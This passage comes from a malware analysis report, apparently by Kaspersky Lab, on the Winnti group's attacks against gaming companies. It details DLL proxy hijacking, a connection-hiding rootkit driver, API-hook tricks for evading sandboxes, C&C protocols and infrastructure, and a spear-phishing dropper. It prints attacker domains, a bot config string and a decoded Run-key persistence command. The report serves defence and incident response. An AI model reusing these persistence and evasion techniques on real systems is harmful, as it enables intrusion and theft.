without a DNS A-record, i.e., there was no IP address assigned to it.In cases where there was an A-record, the assigned IP address was typically 127.0.0.1.It is also noteworthy that
some of the second-level domains that the cybercriminals created for their C&C had very similar names to the
domain hosting the site of a certain real gaming company.And the malicious users’ domain was resolved to the
same IP address which the site of the real gaming company used.In any case, the third-level domains resolved to IP
addresses assigned to the attackers’ actual C&C servers.<figure></figure>
                                           <caption>C&C domain naming and resolution</caption>

Sometimes the Winnti team registered their C&C units with public hosts.Judging by the samples identified, these
C&C centers were subdomains of such domains as 6600.org, 8866.org, 9966.org or ddns.net.From the names of the C&C domains or subdomains, the attack targets or countries of residence could be guessed,
as in:

ru.gcgame.info
kr.zzsoft.info
jp.xxoo.co
us.nhntech.com
fs.nhntech.com
as.cjinternet.us

The subdomains “ru”, “kr”, ”jp” and “us” most probably mean that these C&C servers manage bots hosted on the
computers of companies located in Russia, South Korea, Japan and the U.S. respectively, while “fs” and “as” are
acronyms for the names of the companies being attacked.<noncontent>PAGE 6| “Winnti” | More than just a game</noncontent>
Sometimes Winnti’s malicious programs had a local IP address, such as 192.168.1.136, specified in the settings for
the C&C.This could mean that, at some point in time, there was an infected computer that did not have a
connection to the Internet, but the cybercriminals needed control over it (it may have been infected while malware
was spread via a corporate network).In this case, the cybercriminals deployed a dedicated local C&C server on
another compromised computer within the same local network which did have an Internet connection; via that
C&C, the first victim computer could be controlled.System administrators often try to isolate critical computers
from the outside world.This decreases the probability of haphazard infection, but, apparently, does not always
help in a targeted attack.In the Winnti samples that were detected and analyzed, we found 36 unique C&C domains.Most probably, this is
only a small portion of all existing Winnti C&C domains, as we only managed to obtain some of the samples from
this malware family.This is hardly surprising since these malicious programs are used to execute targeted attacks,
so no information is available about many instances of infection; for this reason, we have no way of obtaining
samples of the malware used in these undisclosed attacks.Having searched through
subdomains for a total of 12 second level domains, we identified 227 “live” third level domains.Many of them are
C&C servers for Winnti-class malware that have hitherto remained unidentified.The
early domains were involved in spreading rogue anti-virus programs (FakeAV).From 2009 onwards, domains began
to emerge hosting C&C servers for bots used to infect gaming companies.Apparently, the cybercriminals
graduated to relatively large-scale penetrations into the corporate networks of gaming companies starting from
2010.</section>
<section>
<heading>Known Malware</heading>

The favorite tool of the attackers is a malicious program we call "Winnti".It has evolved since the first use, but we
divide all variants into two generations: 1.x and 2.x.Our publication describes both variants of this tool.The second
generation (2.x) was used in one of the attacks that we investigated in the active stage and helped the victim to
interrupt data transfer and isolate infections in a corporate network.In addition to that, we observed usage of a popular backdoor known as PlugX, which is believed to have Chinese
origins, however used only previously in attacks against Tibetan activists.</section>

<noncontent>PAGE 8| “Winnti” | More than just a game</noncontent>
<section>
<heading>The Commercial Interest</heading>

As has been stated above, APTs can target any commercial company if cyber-criminals find a way to financially
profit from the attack.So what methods do cyber-criminals use to generate illicit earnings from attacks on gaming companies?Based on the available information, we have singled out three main monetization schemes that could be used by
the Winnti team.    The unfair accumulation of in-game currency/“gold” in online games and the conversion of virtual funds
         into real money.    Theft of source code from the online games server to search for vulnerabilities in games – often linked to
         point 1.    Theft of source code from the server part of popular online games to further deploy pirate servers.Let’s look at an example.During our investigation of an infection at a computer gaming company, we found that
malware had been created for a particular service on the company’s server.The malicious program was looking for
a specific process running on the server, injected code into it, and then sought out two places in the process code
where it could conceal call commands for its function interceptors.Using these function interceptors, the malicious
programs modified process data which was processed in those two places, and returned control back.Thus, the
attackers change the normal execution of the server processes.Unfortunately, the company was not able to share
its targeted application with us, and we cannot say exactly how this malicious interference affected gaming
processes.The company concerned told us that the attackers’ aim was to acquire gaming “gold” illegally.Malicious activity like this has an adverse impact on the game itself, tilting the balance in favor of cheats.But any
changes the Winnti team introduces into the game experience are unlikely to be very noticeable.After all,
maintaining a skillful balance is the main attribute of online games.Users will simply stop playing if they feel that
other players are using non-standard methods to create an advantage beyond normal gameplay or if the game
loses its intrinsic competitiveness due to resources or artifacts appearing in the game without the developers’
knowledge.At the same time, the attackers are keen for the game to remain popular; otherwise, they would be
unable to effectively turn all the time and effort of infecting a gaming company into financial gain.Members of the Winnti team are patient and cautious.Cyber-criminals have affected the processes of the online
games from the infected companies and stolen money from them for years, but they have found ways of doing this
without attracting attention to themselves.</section>


<noncontent>PAGE 9| “Winnti” | More than just a game</noncontent>
<header>Winnti 1.0 Technical Analysis</header>
<section>
<heading>The Initial DLL</heading>
Everything starts with a DLL.The DLL mimics one of the standard Windows libraries, winmm.dll or apphelp.dll.Since, in the vast majority of cases the samples that we detected disguised themselves as winmm.dll, we would like
to fix this name for this malicious library at the end of this document.Legitimate winmm.dll is a Windows system library that provides multimedia functions.It is located in
the %WINDIR%\System32 folder.The attackers counted on this being a library providing basic system functions
and hence the probability of it being loaded by some program is very high (this is also valid for apphelp.dll).For
example, winmm.dll is loaded by explorer.exe, which is launched during operating system startup and is essential
for Windows user interface.The mechanism to start the malware is simple: if some benign application depends on Windows winmm.dll
(located in %WINDIR%\System32\winmm.dll) but the evil twin library with the same name (winmm.dll) is located
in the folder of benign application, the malicious library will be loaded instead of the system one.Taking advantage of their control of an infected computer, the attackers place a malicious library in the %WINDIR%
folder.The same folder also contains explorer.exe.This enables the attackers to ensure that the malicious DLL is
loaded at system startup: explorer.exe loads the malicious winmm.dll from the %WINDIR% folder as soon as it
launches during system startup.But how can a program which depends on the original library work correctly if a malicious winmm.dll is loaded
instead of the original library?Very easy: the malicious library is designed to work as a proxy for the original
winmm.dll from the %WINDIR%\System32 folder.The cyber-criminals did not reinvent the wheel to make sure that everything works properly.They relied on a tool
known as AheadLib, which was developed by security researchers to analyze malware.<noncontent>PAGE 10| “Winnti” | More than just a game</noncontent>
<figure></figure>
This program, which is designed to facilitate the analysis of malicious libraries, was created by a Chinese developer
employed by an Asian anti-virus vendor.The program accepts a DLL on input and produces a C code which hooks
the functions included in the library.The C code is compiled back into a DLL, which can then be used as a proxy and
provide flexible way to analyze behavior of malicious file.<figure></figure>



<noncontent>PAGE 11| “Winnti” | More than just a game</noncontent>
<figure></figure>
                         <caption>Hook functions (code generated by the legitimate program AheadLib)</caption>

The flexibility of this tool allows to customize the logics of malicious application during analysis and overload
functions code to provide some debugging output.Some code can be added to display parameters of the hooked
functions in order to find out which values are passed to the original functions when they are called.This method is
used in so called dynamic analysis of malicious applications.They specified a system library (winmm.dll) as a parameter for AheadsLib tool and produced a source
code template to create a proxy DLL – in the form of C file.By overloading some functions with the malicious
payload, the attackers created a complete piece of malware that included all the features of the system DLL.Strangely, the attackers kept the code for AheadLib debug messages in the early versions of their malware (marked
with red in the screenshots above).These strings can also be found in compiled malicious binaries:



<figure></figure>
                       <caption>The function %hs cannot be found, the program will not operate correctly</caption>


<noncontent>PAGE 14| “Winnti” | More than just a game</noncontent>
<figure></figure>
                               <caption>%s cannot be loaded, the program will not operate correctly</caption>

Later, these fragments were removed from the C file generated by AheadLib.</section>
<section>
<heading>Control DLL</heading>
The winmm.dll malicious library maintains another library in its body, which is decrypted and loaded into the
process memory without creating any files on local disk.According to file version info the original name of this
library is "PlusDLL.dll".This is the platform’s main control component.When the additional DLL has been properly
allocated in the memory, winmm.dll passes control to it with a parameter – a string which contains bot settings.The settings string, in encrypted form, is also located in the winmm.dll body – after the magic word "PLUSUNIT".<figure></figure>
                                                 <caption>Encrypted bot settings</caption>

After decryption, the string contains the following:

url=lp.gasoft.us:80|ver=1018|tag=33|group=lp80wi

Apparently, when the Winnti malware managed to get into focus of security researchers: the authors made
modifications of the methods used to store these initial settings.In some samples, the settings were hidden even
in the executable file’s header:




<noncontent>PAGE 15| “Winnti” | More than just a game</noncontent>
<figure></figure>
                                 <caption>Encrypted settings in the header of malicious executable</caption>

In other variants, the ‘PLUSUNIT’ magic string was modified:



<figure></figure>
                                            <caption>UUUSUN”” instead of PLUSUNIT</caption>

The PlusDLL library has an embedded driver.The driver is stored in %WINDIR%\System32\<drivername.sys> file,
registered as a service and started by NtLoadDriver system API function.Immediately after that, the driver’s file is
removed, as well as all the registry entries created during service registration.The executable preserved the
original driver names which are "PortLess" and "PointFilter"; however, the driver files used during infection are
saved as "sp1itter.sys" and "acplec.sys".The purpose of the driver is to hide network connections established by the malware.For example, if the user
decides to check a list of established connections (e.g., using the ‘netstat –a’ command or the tcpview program)
while the bot is communicating to the control center, the driver will protect and hide the malware connections.This approach is used by many rootkits on the Windows platform.The driver uses an interesting method to get the list of addresses to protect connections with.This information is
available in the PlusDLL control library, which normally operates in the context of the explorer.exe process when
the infection is active on the computer.The address information is sent from the user space (from PlusDLL) to the
kernel space, where the driver works, via call to NtSetQuotaInformationFile API function.<noncontent>PAGE 16| “Winnti” | More than just a game</noncontent>
During initialization, the driver hooks the NtSetQuotaInformationFile function:
<figure></figure>




                                       <caption>Hook on NtSetQuotaInformationFile function</caption>

Every time the function is called, the driver checks its parameters: to be precise it is HANDLE FileHandle and PVOID
Buffer parameters.The FileHandle parameter holds a descriptor of the partition on the hard drive where the function is expected to
set disk quotas.The Buffer parameter is a memory buffer with information of new quotas to be set.The driver checks whether the
value of the FileHandle parameter is equal to minus two.When the system calls the NtSetQuotaInformationFile
function to actually change the quotas, the descriptor must be associated with one of the disks.Normally such
descriptors in the Windows system are positive integers which obviously means that it cannot be equal to minus
two.The negative value is set by the PlusDLL library in order to make the driver detect that the
NtSetQuotaInformationFile function was called by that library.When calling NtSetQuotaInformationFile, PlusDLL
sends information about the network addresses to be protected by the driver via the Buffer parameter.If
FileHandle is not equal to minus two, the hook function in the driver passes control to system's original code of
NtSetQuoataInformationFile API function and everyhin works as it should be on an uninfected system.<noncontent>PAGE 17| “Winnti” | More than just a game</noncontent>
<figure></figure>
                            <caption>Sending data from the PlusDLL.dll library to the sp1itter.sys driver</caption>

Note that 64-bit versions of Windows do not allow unsigned drivers to run.The malicious driver’s 64-bit versions
were signed using stolen certificates.During the time that we have been tracking the Winnti group, we found 11
certificates that were used to sign the malware used by the group (not necessarily drivers only).Ten of them
belong to various companies in the gaming industry.</section>
<section>
<heading>Launching the main function</heading>
As mentioned above, the PlusDLL library is a control module.Let’s look at how the cybercriminals implemented the
transition to perform the malicious DLL’s main tasks.They could have simply called an appropriate function directly
or created a separate thread in which to execute it, but for some reason they resorted to a trick: the code of the
SetWindowStationUser function in the user32.dll library was modified.After modification, the function’s first
command became jmp <addr>, where <addr> is the address of the function in the PlusDLL library which
implements the malicious library’s main features.<noncontent>PAGE 18| “Winnti” | More than just a game</noncontent>
<figure></figure>
                                            <caption>Hook on SetWindowStationUser</caption>

Immediately after this modification, a thread is created (CreateThread) executing code starting from the
SetWindowStationUser function address.As a result, when control is eventually passed to this function, the
inserted command jmp <addr> returns control back to the PlusDLL code.<noncontent>PAGE 19| “Winnti” | More than just a game</noncontent>
<figure></figure>
       <caption>Malicious DLL launching its own code by creating a thread that supposedly calls SetWindowStationUser</caption>

The same method is used to execute two more functions in the PlusDLL library.One of them is used to initialize
network routines; the other executes procedures terminating the malicious program at the very end.The only
difference is that instead of SetWindowStationUser, the code of two other functions from user32.dll is modified –
EndTask and WinHelpW, respectively.It is likely that this was done in order to hide the real addresses of functions in PlusDLL in case its code was
analyzed based on its execution logs using an automatic system (sandbox) that looks at all function calls.If this trick
is used, an execution log would only show threads launched from the addresses of the functions
SetWindowStationUser, EndTask and WinHelpW, which could potentially confuse researchers.Another possibility is that this is an anti-emulation feature.Perhaps the emulators built into some anti-virus
products are unable to cope with these ‘leaps’ – in this case, emulation will not result in the execution of malicious
functions, which also suits the cybercriminals’ purposes.</section>
<section>
<heading>Target Functionality</heading>
So what does PlusDLL control?It turns out that the target functionality is implemented in different files.Each file
provides a specific remote control feature and is downloaded from the attackers’ server every time the system
starts up.These files are not saved on disk or in the registry but are loaded directly into the memory.At the very start of the operation, after launching the driver, PlusDLL collects information about the infected
system.A unique identifier for the infected computer is generated based on information about the hard drive and
the network adapter’s MAC address, e.g., TKVFP-XZTTL-KXFWH-RBJLF-FXWJR.The attackers are interested
primarily in the computer’s name, the program which loaded the malicious library, as well as information about




<noncontent>PAGE 20| “Winnti” | More than just a game</noncontent>
remote desktop sessions (session name, client name, user name and session time).All of this data is collected in a
buffer, which is then compressed and sent to the attackers’ control center.The buffer may look like this:



<figure></figure>
                       <caption>The bot sends information about an infected system to the control center</caption>

In reply to this initial message from the bot, the control center sends the list of available plugins.Plugins are DLL
libraries that provide specific remote control functions.Upon receiving the list of plugins, the bot downloads them,
allocates them in the memory and passes control to these libraries.Different C2 servers could push different plugins.In total we have discovered eight functional libraries:
<figure>
           Plugin Name                                                Plugin Purpose

    CmdPlus                         Provide access to the system command line.ListFileManager                 Provide access to the file system: list directory contents, manipulate files.ListProc                        List or kill running processes.ListService                     List system services.PortMap                         Redirect traffic using port forwarding.RemoteDesktop                   Enable Remote Desktop service on the infected machine.Socks5Client                    Library for transferring data over the network using a SOCKS5 proxy server.TransPlus                       Enables the attacker to transfer files: receive files from the infected machine,
                                    download/create/save files, as well as execute programs on the infected
                                    computer.</figure>

These plugins form the core toolkit which is used by the perpetrators during attack.</section>


<noncontent>PAGE 21| “Winnti” | More than just a game</noncontent>
<section>
<heading>Operation of the malicious platform</heading>



<figure></figure>
                                            <caption>Operation flowchart at the initial stage</caption>

As you can see, the cybercriminals use an entire inventory of malicious tools to effectively control the remote
computer.Moreover, they have taken measures to conceal their activities: the plugins do not explicitly appear
anywhere except in the computer’s memory; they do not get saved to the hard drive; the driver is deleted
immediately after launch; all traces in the registry that could indicate this launch get deleted.Only the initial DLL
remains on the disk that kick starts the entire process and contains an encrypted version of PlusDLL which is the
control DLL.One of the weak points in this architecture is that the driver does get saved to the hard drive before it launches, so
anti-virus products can detect the emergence of this file.The situation is further exacerbated by the fact that the
malicious drivers may be signed (although not all drivers in the Winnti samples that we detected were in fact
signed).An unsigned driver in itself does not have the means to counter antivirus products and its code can be
easily recognized as malicious, whereas signed drivers stand a better chance of remaining undetected by antivirus
products: certain anti-virus products consider properly signed programs legitimate by default, so as to minimize
the chances of false positive responses.<noncontent>PAGE 22| “Winnti” | More than just a game</noncontent>
Kaspersky Lab’s products detect the malicious programs described above under the following verdicts:

The initial DLLs winmm.dll and apphelp.dll, the PlusDll.dll control DLLs, and functional loadable modules
(CmdPlus.dll etc.)are detected as Backdoor.Win32.Winnti or Backdoor.Win64.Winnti.The drivers sp1itter.sys and acplec.sys are detected as Rootkit.Win32.Winnti or Rootkit.Win64.Winnti.</section>

<section>
<heading>Communication with the C&C Server</heading>

The data transmitted during the communication between the bot and the C&C server, naturally, do not manifest
themselves in any explicit form in online data traffic.Since an active remote control practice can generate
substantial traffic, cybercriminals compress communication data with the algorithm LZMA, though they do not
include the appropriate header inherent to this algorithm.The data is transmitted over the TCP protocol.The samples that we analyzed established connections between
C&C servers and ports 53, 80 and 443.This port selection is not surprising: they are associated with the protocols
DNS, HTTP and HTTPS respectively.All three are routinely used in everyday operations, so they are enabled under
most firewall policies.Besides, large amounts of data typically pass through these ports (with the possible
exception of port 53), which makes it easier for the malicious traffic to remain inconspicuous.Although the ports are associated with certain protocols, the actual content of the traffic generated by the
malicious program does not correspond to them.Early versions of the Winnti platform exhibited the following
traffic structure when communicating with C&C: each block of transmitted data started with the magic number
0xdeadface, followed by the number of blocks (in a DWORD), then the hash of the transmitted block (8 bytes), the
size of compressed data (DWORD), the size of source data (DWORD) and, finally, the actual compressed data.<figure></figure>
                    <caption>The unit structure of a data block transmitted online in early versions of Winnti</caption>

This is where another weak point of the Winnti family of backdoors becomes apparent.With this data structure,
malicious network traffic could easily be spotted by, for example, the magic number 0xdeadface.The
cybercriminals probably lost control over victim computers fairly frequently as corporate system administrators
identified the intrusion by the unique headers in data packets with the help of IDS/IPS systems, and cleaned their
networks.In 2011, new versions of Winnti backdoors appeared that, while still based on the same platform,
started to use an updated protocol which included extra encryption to communicate with C&C, so the transmitted



<noncontent>PAGE 23| “Winnti” | More than just a game</noncontent>
data no longer had static marks in them.Knowing that the first four bytes in the source data must represent the value 0xaced1984, it is easy to restore
the key for the XOR operation when the data were encrypted.Employing this fast, basic
method, the cybercriminals have made it much harder to expose their programs’ traffic.We should note here that, to expedite data downloading, the creators of this platform have quite skillfully
implemented asynchronous data transmission in their protocol.For instance, the message that the bot has
received the first plugin may only arrive at the C&C when nearly all the plugins have been already sent to the bot.Having downloaded the malicious payload, the bot deploys the plugins in the memory and initializes them.Now it’s
all set for complete remote control over the victim computer, and the bot switches to standby mode, waiting for
the operator to connect and maintaining communication with the C&C by sending “empty” messages every 15
seconds or so.Apart from supplying the plugins, no more automatic actions are performed by the C&C: all of the work to examine
the infected computers is done manually by the attackers.</section>



<noncontent>PAGE 25| “Winnti” | More than just a game</noncontent>
<header>Real Case Investigation (Winnti 2.0)</header>
<section>
Please note, that the following is published with approval from one of the attacked companies which preferred to
remain anonymous.The real company name was replaced with "CompanyXYZ" or simply "XYZ".On 21st September 2012, a Security Officer of CompanyXYZ contacted Kaspersky Lab and reported a cyber-attack
incident.Anomalous activity was spotted at one of the corporate servers.One of the employees noticed a
suspicious directory on the server which was created under his account.The folder had a large archived file with
information that was regarded as company's intellectual property.The anomalies were also confirmed in the network traffic by monitoring software.Several suspicious network
connections were established from several computer systems, including network domain controllers, to IP
addresses which were not associated with any corporate resources or any other known trusted networks.The suspicious connections were established on ports 443 and 53.Below is the list of reported IP addresses:

         211.60.126.164 (Seoul, South Korea)
         113.196.70.169 (Taipei Taiwan)

The security officer at CompanyXYZ did an on-site analysis and managed to locate the process which initiated the
suspicious connections using SysInternals Process Explorer tool.The connections were initiated by a system
process (svchost.exe).A full process dump using Process Explorer was made and shared with Kaspersky Lab.Our
team immediately started searching for malware in the provided process dump.A next day, one more dump of svchost.exe from another presumably infected machine was provided.We also received an IP address and port that was spotted in the suspicious connections coming from infected
machines: 188.120.246.88:80 (Russia).</section>
<section>
<heading>First Step Analysis</heading>

Quick search through the dumped processes revealed IP addresses mentioned by the company's security officers.<figure></figure>
                         <caption>Suspected malicious IP address in svchost.exe memory of Machine #1.</caption>



<figure></figure>
                         <caption>Suspected malicious IP address in svchost.exe memory of Machine #2.</caption>


PAGE 26| “Winnti” | More than just a game
We checked memory around location of the IP address and found no signs of executable code.The memory was
most likely dynamically allocated on process heap and used as a temporary storage of resolved domain name.That
is why we had to find another indicator of malicious module related to those IP addresses.We initiated a port scan of the suspected hosts in parallel to memory analysis.Below is the result on the time of
scanning:
<figure>
Nmap scan report for 113.196.70.169
Host is up (0.29s latency).Not shown: 997 filtered ports
PORT STATE SERVICE           VERSION
21/tcp open ftp          Xlight ftpd 2.0
80/tcp closed http
3389/tcp open ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</figure>
The server was running Windows Terminal Service or was used as a proxy linked to some Terminal Server.Establishing connection via RDP client usually reveals default system locale which is used on welcome screen.<figure></figure>
                           <caption>Domain name related to the suspected IP address on Machine #2.</caption>



<figure></figure>
                    <caption>Part of executable configuration seen in svchost memory dump of Machine #1.</caption>




<noncontent>PAGE 28| “Winnti” | More than just a game</noncontent>
Googlefiles.net domain was also found in svchost dump of the Machine #1.Besides that, several other domain
names were discovered in the same memory block:

         service.interdriver.net
         service.googlefiles.net
         service.dell-support.org
         service.hp-supports.com

Next step was to locate the nearest PE header in the memory of svchost and extract the executable module.After
fixing alignment of the sections the file was ready for further static analysis.Date and time from PE header showed that the executable was prepared about a year before current attack was
revealed:

         TimeDateStamp: "2011-10-13 07:21:50"

The executable was a 64-bit application which means that the attackers had already known that CompanyXYZ used
64-bit systems.The IP address 188.120.246.88, which was seen in suspicious connection was also checked.That is probably done by the attackers’ tunneling setup which established a TCP connection with some
local web server within the company network and an external host that received the stolen data.According to the
request, the attackers were downloading a file called G-Content_XYZ.rar, which seems to be an archive of over
25Gb long.The transfer process was instantly interrupted by Security Officers of the company.</section>
<section>
<heading>Tactical Pattern Recognition</heading>
The embedded configuration shows some file names.C_20100.NLS was discovered later as the file hosting the
same malicious code on the hard drive.WinIo.sys is a driver module on Microsoft Windows Server systems used to
process networking requests.Another interesting piece of data was in a short string “xyz”, which probably refers to the attack campaign name
and was defined by the attackers, who deliberately put that name to tag the malware.The word “xyz” most likely
stands for the campaign name which comes from the attacked company's name “CompanyXYZ”.That was the first evidence that we were dealing with a well-prepared targeted attack against CompanyXYZ.From
our previous experience, we have seen several targeted attacks against gaming companies and some of them were
also tagged after the name of the companies.In all those attacks there was a recognizable pattern of the attackers:
they always used third-level domain names for the command and control server of the malware while second-level



<noncontent>PAGE 29| “Winnti” | More than just a game</noncontent>
domain name usually resolved to 127.0.0.1 or was a public DDNS domain.A quick check confirmed that this tactical
pattern was present in this case as well.Since then, we believed that it is the same attackers we already knew
about.This group of attackers was internally labeled “Winnti” by one of our researchers, who named it after one of
the very first discovered executable malicious modules.</section>
<section>
<heading>Active Attack Countermeasures</heading>
As soon as we discovered additional configuration, secondary domain names and IP addresses that could be used
to control the infected hosts, we instantly reported it to the CompanyXYZ’s Security Officer, who instantly adjusted
network firewall rules to block all connections to the attackers’ hosts.Simple creation of a key named
HKLM\System\CurrentControlSet\services\Nwsapagent could fail if the system was infected.<figure></figure>
                    <caption>Rootkit detection method - registry key renaming fails if the key already exists.</caption>

The rootkit module protected the registry key, but it didn't protect the executable module stored on the hard
drive.It was possible to rename c_20100.NLS file, reboot the machine and clean the registry.Alternative and even more reliable method was to reboot into Windows Safe Mode, clean the registry key and
delete the c_20100.NLS file.This method was used by company's System Administrators to find other modules that
were not in c_20100.NLS.</section>
<section>
<heading>The Infection Vector</heading>
Since the infection was located and cleaned, the next step was to locate the breach used by the attackers to
penetrate the network.Security Officers of the company suggested to start checking from a distinct host they have



<noncontent>PAGE 30| “Winnti” | More than just a game</noncontent>
suspected.The host (lets call it Machine #3) belong to an employee without network administrators rights.It was
known that it had connected to the attackers' IPs like the server systems.The affected company’s security officers obtained a copy of the hard drive of the suspected machine and provided
a remote access to the disk image.This gave an even earlier suspected timestamp of infection:

2012-09-05 17:27:04 UTC or 2012-09-05 20:27:04 (local system timezone, UTC+3)

At the time of check there was no reference in the registry that was linked to tcprelay.sys, perhaps due the fact
that system administrators had already cleaned the registry.This was confirmed by a file in local Administrator's
Desktop folder:

C:\Documents and Settings\Administrator\Desktop\1.reg (created on 2012-09-24 12:44:07 UTC)

The file had an exported registry data, which had been removed from the registry during system cleanup on 24th
September 2012.Here is the original contents of the registry key
(HKLM\SYSTEM\CurrentControlSet\Services\tcprelay) before it was removed:



<figure></figure>
                                   <caption>Tcprelay.sys registry settings with original file path.</caption>

Once the infection on the machine was confirmed we started looking for the origins of the malicious files.From our
previous experience of Winnti gang tactics, we knew that they are keen on sending targeted emails with attached
executables.Security Officers helped us check all the emails stored in local Outlook database file on suspected
dates of infection, however that didn't reveal anything suspicious.We have also found system event log files which were copied and analyzed.Event logs had records of tcprelay
service start timestamps which confirmed the discovered date of infection.User SID corresponded to the local user
account according to the registry.<noncontent>PAGE 31| “Winnti” | More than just a game</noncontent>
                                Tcprelay service first start time from the Event Log

The Machine #3 had an anti-virus program installed.Checking detection logs of the anti-virus on the suspected
date of infection (05.09.2012) showed that there was a single detection right before tcprelay service first start.<figure></figure>
                                            <caption>Part of the antivirus quarantine log.</caption>

We recovered the PDF document called “Transmission with Steps, Realited and Compressed.pdf” from the anti-
virus quarantine and prepared to find an exploit inside.The PDF had a lot of obfuscated JavaScript code inside,
however we believe that it was not related to the original infection of the system.It was clean and the anti-virus
detected it by mistake, probably because of some suspicious obfuscated JavaScript code.<noncontent>PAGE 32| “Winnti” | More than just a game</noncontent>
<figure></figure>                                  <caption>PDF document detected by the antivirus as malicious.</caption>

The JavaScript code inside the PDF was used to process an interactive form inside the PDF and support dynamic
interactive 3D model embedded in the document using Adobe 3D technology.After that, we checked the infected machine’s browser history.The Internet Explorer history log files showed that
the user was reading email right before the infection of his machine.<figure></figure>
                               <caption>Internet Explorer log history record: html file from Outlook.</caption>



<noncontent>PAGE 33| “Winnti” | More than just a game</noncontent>
With that in mind, we analyzed the Outlook local database again.This time we used several techniques to recover
emails that were deleted from the Trash folder.This helped to partly recover a message which arrived on the day
of infection.<figure></figure>
                                     <caption>Recovered targeted attack email on Machine#3.</caption>

The text of the message supposed to contain an attachment, however the attachment and MIME headers of the
email were completely lost and couldn't be recovered.However, it was clear that the email was a targeted attack
against the employee of the company.It was sent from companyxxyz@163.com and replaced “From” field in the
email body which made it look like a legitimate email in the list of messages in Outlook.<figure></figure>
                                  <caption>Targetted attack email in the list of Outlook messages.</caption>



<noncontent>PAGE 34| “Winnti” | More than just a game</noncontent>
We discovered a Windows prefetch file in the system directory, that was created when the malicious attachment
was opened.The timestamp correlates with the time of infection.C:\WINDOWS\Prefetch\CompanyXYZ EMPLOYEE SALARY ADJ-1AF9D56A.pf

         Time of creation: 2012-09-05 19:52:00 (local timezone, UTC+03)

Unfortunately, the prefetch file format is proprietary and there is nothing interesting in those files, except the
original executable file name.Full path of the malicious executable that infected the first computer in the company
was:

C:\Documents and Settings\<Username>\LocalSettings\Temp\RAR$EX00.156\CompanyXYZ EMPLOYEE SALARY
ADJUSTMENTS EBOOK.EXE

According to the file path, this executable was a part of an archive, which was opened with WinRAR installed on
the system.Upon discovery, we requested the Security Officers to provide us with full MIME as well as to check who else may
have received the same message.The check discovered series of emails sent to several publicly known email
addresses.In all cases the text message was the same as shown above, however sent from different mailboxes.There was only
one file inside ZIP archive, called “CompanyXYZ Employee Salary Adjustments Ebook.exe”.Full details about this
application are provided further down in current report.To summarize, the targeted attack started from an email sent at 05.09.2012 19:12 (UTC+03).It resulted in system infection at 05.09.2012 19:52 (UTC+03).</section>



<noncontent>PAGE 35| “Winnti” | More than just a game</noncontent>
<section>
<heading>Full File Analysis</heading>
<heading>Salary adjustments.zip File</heading>
Size: 96782
MD5: 1b56416fefa2d2c863f3b46dfb6dc353
Location: targeted attack email message attachment
Creation time (author's timezone): 2012-09-05 14:29:10

This file is just a container for “CompanyXYZ Employee Salary Adjustments Ebook.exe”.</section>
<section>
<heading>CompanyXYZ Employee Salary Adjustments Ebook.exe File</heading>
Size: 122880
MD5: 6ef66c2336b2b5aaa697c2d0ab2b66e2
Location: “Salary adjustments.zip”
Creation time: unavailable
Link time (UTC): 2012-07-21 18:50:18

Internal name: FlashUpdate.EXE

This application is a wrapper for another embedded executable modules.It serves as a dropper of malware.<figure></figure>
                                            <caption>Malware dropper file structure</caption>

Notable fact: this application has a resource section inside and the default locale is set to Chinese Simplified.The file creates three long binary data registry keys, two of which are encrypted executable modules and one
encrypted config from the body of the original dropper.These values are encrypted with simple 1-byte XOR.<noncontent>PAGE 36| “Winnti” | More than just a game</noncontent>
<figure></figure>
                                            <caption>Decrypted sysinfo config contents</caption>

Sysinfo config module is used by sysbin01.Apparently it starts with the company name and has three domain
names, one of which is most likely used to check Internet connectivity (update.microsoft.com).Sysbin01 module is a loader component.It creates several threads running various jobs.Sysbin01.thread#1 attempts to load %TEMP%\<ComputerName>.ax file and decrypts it.<figure></figure>
                                           <caption><ComputerName>.ax file structure</caption>

We checked the system but couldn't find <ComputerName>.ax file in the Temp folder of the user, however we
found other .ax-files that seemed to be related because of the date of file creation.File name: C:\Documents and Settings\%User%\Local Settings\Temp\%ComputerName%_p.ax
File size: 2660
Creation time (UTC): 2012-09-06 06:22:42
MD5: unavailable (the system went offline before we discovered the filepath).File name: C:\Documents and Settings\%User%\Local Settings\Temp\uid.ax
File size: 16
Creation time (UTC): 2012-09-06 05:03:06
MD5: unavailable (the system went offline before we discovered the filepath).According to the code that loads <ComputerName>.ax it is an encrypted executable file, which is decrypted and
loaded to memory by own loader routine in the sysbin01 module.Sysbin01.thread#2 spawns a new instance of Sysbin01.thread#3 every 10 seconds during, that is done 3 times.<noncontent>PAGE 37| “Winnti” | More than just a game</noncontent>
Sysbin01.thread#3

This thread is the most important.It reads the configuration from the registry and connects to the C&C servers
specified in the config via direct tcp connection or via proxy that is fetched from the the settings of locally logged in
user profile.The config had the following C&C: tank.hja63.com.It sends a “POST /<HEXNUMBER>” request with
User-Agent “lynx”, the data after HTTP header is just “AA”, expected answer is also “AA”.This thread also creates %TEMP%\uid.ax and stores current system unique ID, which is generated by CoCreateGuid
system API (16 bytes).It is able to receive and save data from the C&C server to a file.It also monitors windows of
explorer.exe and copies textual data from password fields if the user types in, stolen data is saved to a file first.After all threads are launched, the main thread waits for termination of Sysbin01.thread#3, which is created first
and then exits.sysbin02 module behaviors depends on currently running processes.There is an embedded DLL file according to
Figure 15 in sysbin02.If the system has a running process named “360tray.exe”, then the embedded file is stored
in %SYSTEM%\MFC42LOC.DLL, then copies the source executable (FlashUpdate.exe) to %TEMP%\Flash.tmp and
runs a new process from that location via WMI Win32_Process.Create method.If the system has a running process named “bdagent.exe”, then it copies the source executable (FlashUpdate.exe)
to %TEMP%\Flash.tmp, decodes an embedded Base64 string and executes.The string has the following text after
decoding:

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v FlashUpdate /t
REG_EXPAND_SZ /d """"%APPDATA%\FlashUpdate.exe""" -update activex" /f

The module also saves current module file path to the registry in the following key location:
HKCU\Software\Classes\path

Next it patches the tmp file with two dword “AAAA” values which looks like corruption of embedded encrypted
sysbin modules inside.The meaning of this action is currently unclear.Then it moves Flash.tmp file to FlashUpdate.exe by and starts a new process from new location.Finally, if there is not “qqpctray.exe” process running, and this seemed to be the case for the analyzed system, it
copies the source executable (FlashUpdate.exe) to %TEMP%\Flash.tmp, patches the new file and increases its size
by adding system explorer.exe file contents to the resource section “RC Data” 20 times.The purpose of this is to
make the new executable look like the real update service of Adobe Flash, it simply stuffs the file with executable
code of another application.Then it moves the file to new location %APPDATA%\FlashUpdate.exe, saves new
